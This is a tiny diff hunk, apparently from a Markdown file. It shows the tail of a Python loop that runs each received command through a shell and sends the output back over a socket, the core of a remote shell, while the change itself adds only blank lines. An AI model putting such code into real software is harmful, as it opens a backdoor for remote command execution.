@@ -25,3 +25,5 @@ while True:
     p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
     c.sendall(p.stdout.read()+p.stderr.read())
 ```
+
+
